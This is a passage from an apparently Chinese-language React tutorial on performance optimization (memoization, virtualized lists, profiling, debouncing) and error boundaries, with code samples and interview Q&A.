class="hljs-params"></span>) =&gt; &#123;<br>  <span class="hljs-comment">// 只订阅需要的上下文</span><br>  <span class="hljs-keyword">const</span> settings = <span class="hljs-title function_">useContext</span>(<span class="hljs-title class_">SettingsContext</span>);<br>  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>当前主题: &#123;settings.theme&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>;<br>&#125;;<br><br><span class="hljs-comment">// 使用 React.memo 防止不必要渲染</span><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">Header</span> = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">memo</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> user = <span class="hljs-title function_">useContext</span>(<span class="hljs-title class_">UserContext</span>);<br>  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">header</span>&gt;</span>&#123;user ? user.name : &#x27;游客&#x27;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">header</span>&gt;</span></span>;<br>&#125;);<br></code></pre></td></tr></table></figure><p><strong>虚拟化长列表</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">import</span> &#123; <span class="hljs-title class_">FixedSizeList</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react-window&#x27;</span>;<br><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">BigList</span> = (<span class="hljs-params">&#123; items &#125;</span>) =&gt; &#123;<br>  <span class="hljs-keyword">const</span> <span class="hljs-title function_">Row</span> = (<span class="hljs-params">&#123; index, style &#125;</span>) =&gt; (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&#123;style&#125;</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">ListItem</span> <span class="hljs-attr">item</span>=<span class="hljs-string">&#123;items[index]&#125;</span> /&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  );<br><br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">FixedSizeList</span></span></span><br><span class="hljs-tag"><span class="language-xml">      <span class="hljs-attr">height</span>=<span class="hljs-string">&#123;600&#125;</span></span></span><br><span class="hljs-tag"><span class="language-xml">      <span class="hljs-attr">width</span>=<span class="hljs-string">&#123;800&#125;</span></span></span><br><span class="hljs-tag"><span class="language-xml">      <span class="hljs-attr">itemCount</span>=<span class="hljs-string">&#123;items.length&#125;</span></span></span><br><span class="hljs-tag"><span class="language-xml">      <span class="hljs-attr">itemSize</span>=<span class="hljs-string">&#123;100&#125;</span> // <span class="hljs-attr">每项高度</span></span></span><br><span class="hljs-tag"><span class="language-xml">    &gt;</span></span><br><span class="language-xml">      &#123;Row&#125;</span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">FixedSizeList</span>&gt;</span></span><br>  );<br>&#125;;<br><br><span class="hljs-comment">// 优化列表项</span><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">ListItem</span> = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">memo</span>(<span class="hljs-function">(<span class="hljs-params">&#123; item &#125;</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;item&quot;</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">Avatar</span> <span class="hljs-attr">url</span>=<span class="hljs-string">&#123;item.avatar&#125;</span> /&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>&#123;item.name&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>&#123;item.description&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  );<br>&#125;);<br></code></pre></td></tr></table></figure><h3 id="性能分析工具"><a href="#性能分析工具" class="headerlink" title="性能分析工具"></a>性能分析工具</h3><p><strong>React DevTools Profiler</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 使用示例</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">ProfilerTest</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Profiler</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;Navigation&quot;</span> <span class="hljs-attr">onRender</span>=<span class="hljs-string">&#123;onRenderCallback&#125;</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">Navigation</span> /&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">Profiler</span>&gt;</span></span><br>  );<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">onRenderCallback</span>(<span class="hljs-params"></span><br><span class="hljs-params">  id, <span class="hljs-comment">// Profiler 树的 &quot;id&quot;</span></span><br><span class="hljs-params">  phase, <span class="hljs-comment">// &quot;mount&quot; 或 &quot;update&quot;</span></span><br><span class="hljs-params">  actualDuration, <span class="hljs-comment">// 本次更新花费的渲染时间</span></span><br><span class="hljs-params">  baseDuration, <span class="hljs-comment">// 估计不使用 memoization 的渲染时间</span></span><br><span class="hljs-params">  startTime, <span class="hljs-comment">// 本次更新开始时间</span></span><br><span class="hljs-params">  commitTime, <span class="hljs-comment">// 提交时间</span></span><br><span class="hljs-params">  interactions <span class="hljs-comment">// 本次更新所关联的 set</span></span><br><span class="hljs-params"></span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`组件 <span class="hljs-subst">$&#123;id&#125;</span> 的 <span class="hljs-subst">$&#123;phase&#125;</span> 阶段耗时: <span class="hljs-subst">$&#123;actualDuration&#125;</span>ms`</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>Chrome Performance Tab</strong></p><ul><li>操作步骤：<ul><li>打开 Chrome DevTools</li><li>切换到 Performance 选项卡</li><li>点击 Record 开始记录</li><li>执行页面操作</li><li>停止记录分析火焰图</li></ul></li><li>关键指标：<ul><li>Scripting：JavaScript 执行时间</li><li>Rendering：样式计算和布局</li><li>Painting：像素绘制时间</li><li>Idle：空闲时间</li></ul></li></ul><h3 id="常见性能问题与解决方案"><a href="#常见性能问题与解决方案" class="headerlink" title="常见性能问题与解决方案"></a>常见性能问题与解决方案</h3><p><strong>状态频繁变更导致渲染抖动</strong></p><p>场景：输入框实时搜索导致频繁渲染</p><p>解决方案：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">SearchBox</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> [inputValue, setInputValue] = <span class="hljs-title function_">useState</span>(<span class="hljs-string">&#x27;&#x27;</span>);<br>  <span class="hljs-keyword">const</span> [searchResults, setSearchResults] = <span class="hljs-title function_">useState</span>([]);<br>  <br>  <span class="hljs-comment">// 使用防抖</span><br>  <span class="hljs-keyword">const</span> debouncedSearch = <span class="hljs-title function_">useMemo</span>(<span class="hljs-function">() =&gt;</span> <br>    <span class="hljs-title function_">debounce</span>(<span class="hljs-function"><span class="hljs-params">query</span> =&gt;</span> &#123;<br>      api.<span class="hljs-title function_">search</span>(query).<span class="hljs-title function_">then</span>(setSearchResults);<br>    &#125;, <span class="hljs-number">300</span>),<br>  []);<br>  <br>  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-title function_">debouncedSearch</span>(inputValue);<br>    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> debouncedSearch.<span class="hljs-title function_">cancel</span>();<br>  &#125;, [inputValue, debouncedSearch]);<br>  <br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> </span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">value</span>=<span class="hljs-string">&#123;inputValue&#125;</span></span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">onChange</span>=<span class="hljs-string">&#123;e</span> =&gt;</span> setInputValue(e.target.value)&#125;</span><br><span class="language-xml">      /&gt;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">ResultsList</span> <span class="hljs-attr">results</span>=<span class="hljs-string">&#123;searchResults&#125;</span> /&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>复杂组件树更新缓慢</strong></p><p>场景：大型表单组件局部更新</p><p>解决方案：状态隔离 + React.memo</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> <span class="hljs-title function_">BigForm</span> = (<span class="hljs-params"></span>) =&gt; &#123;<br>  <span class="hljs-keyword">const</span> [formData, setFormData] = <span class="hljs-title function_">useState</span>(initialData);<br>  <br>  <span class="hljs-comment">// 状态更新函数</span><br>  <span class="hljs-keyword">const</span> updateField = <span class="hljs-title function_">useCallback</span>(<span class="hljs-function">(<span class="hljs-params">field, value</span>) =&gt;</span> &#123;<br>    <span class="hljs-title function_">setFormData</span>(<span class="hljs-function"><span class="hljs-params">prev</span> =&gt;</span> (&#123; ...prev, [field]: value &#125;));<br>  &#125;, []);<br>  <br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">form</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">PersonalSection</span> </span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">data</span>=<span class="hljs-string">&#123;formData.personal&#125;</span> </span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">onChange</span>=<span class="hljs-string">&#123;updateField&#125;</span> </span></span><br><span class="hljs-tag"><span class="language-xml">      /&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">AddressSection</span> </span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">data</span>=<span class="hljs-string">&#123;formData.address&#125;</span> </span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">onChange</span>=<span class="hljs-string">&#123;updateField&#125;</span> </span></span><br><span class="hljs-tag"><span class="language-xml">      /&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">PaymentSection</span> </span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">data</span>=<span class="hljs-string">&#123;formData.payment&#125;</span> </span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">onChange</span>=<span class="hljs-string">&#123;updateField&#125;</span> </span></span><br><span class="hljs-tag"><span class="language-xml">      /&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span><br>  );<br>&#125;;<br><br><span class="hljs-comment">// 优化子组件</span><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">PersonalSection</span> = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">memo</span>(<span class="hljs-function">(<span class="hljs-params">&#123; data, onChange &#125;</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">section</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">Input</span> </span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">label</span>=<span class="hljs-string">&quot;姓名&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">value</span>=<span class="hljs-string">&#123;data.name&#125;</span></span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">onChange</span>=<span class="hljs-string">&#123;v</span> =&gt;</span> onChange(&#x27;name&#x27;, v)&#125;</span><br><span class="language-xml">      /&gt;</span><br><span class="language-xml">      &#123;/* 其他字段 */&#125;</span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">section</span>&gt;</span></span><br>  );<br>&#125;, <span class="hljs-function">(<span class="hljs-params">prev, next</span>) =&gt;</span> &#123;<br>  <span class="hljs-comment">// 仅当 personal 部分变化时重新渲染</span><br>  <span class="hljs-keyword">return</span> <span class="hljs-title function_">shallowEqual</span>(prev.<span class="hljs-property">data</span>, next.<span class="hljs-property">data</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><p><strong>动画卡顿问题</strong></p><p>解决方案：使用 CSS 动画 + will-change</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> <span class="hljs-title function_">AnimatedBox</span> = (<span class="hljs-params">&#123; position &#125;</span>) =&gt; &#123;<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> </span></span><br><span class="hljs-tag"><span class="language-xml">      <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;animated-box&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml">      <span class="hljs-attr">style</span>=<span class="hljs-string">&#123;&#123;</span> </span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">transform:</span> `<span class="hljs-attr">translateX</span>($&#123;<span class="hljs-attr">position</span>&#125;<span class="hljs-attr">px</span>)`,</span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">willChange:</span> &#x27;<span class="hljs-attr">transform</span>&#x27; // <span class="hljs-attr">提示浏览器优化</span></span></span><br><span class="hljs-tag"><span class="language-xml">      &#125;&#125;</span></span><br><span class="hljs-tag"><span class="language-xml">    /&gt;</span></span><br>  );<br>&#125;;<br><br><span class="hljs-comment">// CSS 中使用 GPU 加速</span><br>.<span class="hljs-property">animated</span>-box &#123;<br>  <span class="hljs-attr">transition</span>: transform <span class="hljs-number">0.</span>3s ease-out;<br>  <span class="hljs-comment">/* 启用 GPU 加速 */</span><br>  <span class="hljs-attr">transform</span>: <span class="hljs-title function_">translateZ</span>(<span class="hljs-number">0</span>);<br>  backface-<span class="hljs-attr">visibility</span>: hidden;<br>  <span class="hljs-attr">perspective</span>: 1000px;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="性能优化原则总结"><a href="#性能优化原则总结" class="headerlink" title="性能优化原则总结"></a>性能优化原则总结</h3><ol><li>测量优先：优化前先使用 Profiler 分析性能瓶颈</li><li>避免过早优化：只在必要时应用优化技术</li><li>关注关键路径：优先优化渲染频率高的组件</li><li>合理使用工具：<ol><li>React.memo 用于组件记忆化</li><li>useMemo 用于昂贵计算缓存</li><li>useCallback 用于函数引用稳定</li></ol></li><li>结构优化：<ol><li>组件职责单一化</li><li>状态合理下沉</li><li>避免深层嵌套</li></ol></li></ol><h3 id="面试高频问题与解答"><a href="#面试高频问题与解答" class="headerlink" title="面试高频问题与解答"></a>面试高频问题与解答</h3><p><strong>Q：React.memo 与 useMemo 有什么区别？</strong></p><ul><li>React.memo 是高阶组件，用于包装组件，避免不必要的重新渲染</li><li>useMemo 是Hook，用于在组件内部缓存计算结果</li><li>前者优化组件渲染，后者优化计算性能</li></ul><p><strong>Q：什么情况下应该使用 useCallback？</strong></p><ul><li>当函数作为 props 传递给记忆化组件（React.memo）</li><li>当函数作为其他 Hook 的依赖项（如 useEffect）</li><li>当函数在渲染中被创建且依赖项未改变时</li></ul><p><strong>Q：为什么使用 useMemo&#x2F;useCallback 后性能反而下降？</strong></p><ul><li>过度使用：简单计算使用 useMemo 得不偿失</li><li>依赖项错误：依赖项频繁变化导致重新计算</li><li>比较成本高：自定义比较函数复杂度高</li><li>闭包陷阱：函数闭包持有旧值导致逻辑错误</li></ul><p><strong>Q：如何避免 useCallback 的闭包陷阱？</strong></p><p>解决方案：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 方案1：使用函数式更新</span><br><span class="hljs-keyword">const</span> increment = <span class="hljs-title function_">useCallback</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-title function_">setCount</span>(<span class="hljs-function"><span class="hljs-params">prev</span> =&gt;</span> prev + <span class="hljs-number">1</span>);<br>&#125;, []);<br><br><span class="hljs-comment">// 方案2：使用 ref 保存最新值</span><br><span class="hljs-keyword">const</span> countRef = <span class="hljs-title function_">useRef</span>(count);<br>countRef.<span class="hljs-property">current</span> = count;<br><br><span class="hljs-keyword">const</span> logCount = <span class="hljs-title function_">useCallback</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(countRef.<span class="hljs-property">current</span>);<br>&#125;, []);<br><br><span class="hljs-comment">// 方案3：正确声明依赖项</span><br><span class="hljs-keyword">const</span> logCount = <span class="hljs-title function_">useCallback</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(count);<br>&#125;, [count]); <span class="hljs-comment">// 依赖 count</span><br></code></pre></td></tr></table></figure><h2 id="4-2-错误边界（ErrorBoundary）"><a href="#4-2-错误边界（ErrorBoundary）" class="headerlink" title="4.2 错误边界（ErrorBoundary）"></a>4.2 错误边界（ErrorBoundary）</h2><h3 id="错误边界核心概念"><a href="#错误边界核心概念" class="headerlink" title="错误边界核心概念"></a>错误边界核心概念</h3><p><strong>错误边界解决的问题</strong></p><pre class="mermaid">graph TD    A[组件树中的错误] --> B[React 16 前]    A --> C[React 16+]    B --> D[整个应用崩溃]    C --> E[错误边界捕获]    E --> F[降级UI展示]    E --> G[错误日志记录]</pre><p><strong>错误边界能力范围</strong></p><table><thead><tr><th align="left">可捕获</th><th align="left">不可捕获</th></tr></thead><tbody><tr><td align="left">子组件渲染错误</td><td align="left">事件处理器错误</td></tr><tr><td align="left">生命周期方法错误</td><td align="left">异步代码错误</td></tr><tr><td align="left">构造函数错误</td><td align="left">服务端渲染错误</td></tr><tr><td align="left">整个组件树的错误</td><td align="left">错误边界自身错误</td></tr></tbody></table><h3 id="错误边界实现机制"><a href="#错误边界实现机制" class="headerlink" title="错误边界实现机制"></a>错误边界实现机制</h3><p><strong>基础实现方案</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">ErrorBoundary</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">React.Component</span> &#123;<br>  state = &#123; <span class="hljs-attr">hasError</span>: <span class="hljs-literal">false</span>, <span class="hljs-attr">error</span>: <span class="hljs-literal">null</span> &#125;;<br>  <br>  <span class="hljs-keyword">static</span> <span class="hljs-title function_">getDerivedStateFromError</span>(<span class="hljs-params">error</span>) &#123;<br>    <span class="hljs-keyword">return</span> &#123; <span class="hljs-attr">hasError</span>: <span class="hljs-literal">true</span>, error &#125;;<br>  &#125;<br>  <br>  <span class="hljs-title function_">componentDidCatch</span>(<span class="hljs-params">error, errorInfo</span>) &#123;<br>    <span class="hljs-comment">// 记录错误到监控系统</span><br>    <span class="hljs-title function_">logErrorToService</span>(error, errorInfo.<span class="hljs-property">componentStack</span>);<br>    <br>    <span class="hljs-comment">// 可选的错误恢复逻辑</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_">isRecoverable</span>(error)) &#123;<br>      <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">setState</span>(&#123; <span class="hljs-attr">hasError</span>: <span class="hljs-literal">false</span> &#125;), <span class="hljs-number">5000</span>);<br>    &#125;<br>  &#125;<br>  <br>  <span class="hljs-title function_">render</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">state</span>.<span class="hljs-property">hasError</span>) &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">props</span>.<span class="hljs-property">fallback</span> || (<br>        <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;error-boundary&quot;</span>&gt;</span></span><br><span class="language-xml">          <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>应用遇到问题<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span></span><br><span class="language-xml">          <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>&#123;this.state.error.message&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><br><span class="language-xml">          <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;()</span> =&gt;</span> window.location.reload()&#125;&gt;</span><br><span class="language-xml">            重新加载</span><br><span class="language-xml">          <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>      );<br>    &#125;<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">props</span>.<span class="hljs-property">children</span>;<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// 使用示例</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">ErrorBoundary</span> </span></span><br><span class="hljs-tag"><span class="language-xml">      <span class="hljs-attr">fallback</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">CriticalErrorScreen</span> /&gt;</span>&#125;</span><br><span class="language-xml">    &gt;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">MainApplication</span> /&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">ErrorBoundary</span>&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>高级特性实现</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 带错误恢复功能的边界</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">RecoverableErrorBoundary</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">React.Component</span> &#123;<br>  state = &#123; <span class="hljs-attr">error</span>: <span class="hljs-literal">null</span>, <span class="hljs-attr">errorInfo</span>: <span class="hljs-literal">null</span>, <span class="hljs-attr">recoveryKey</span>: <span class="hljs-number">0</span> &#125;;<br>  <br>  <span class="hljs-title function_">componentDidCatch</span>(<span class="hljs-params">error, errorInfo</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">setState</span>(&#123; <br>      error, <br>      errorInfo,<br>      <span class="hljs-attr">recoveryKey</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">state</span>.<span class="hljs-property">recoveryKey</span> + <span class="hljs-number">1</span><br>    &#125;);<br>  &#125;<br>  <br>  handleReset = <span class="hljs-function">() 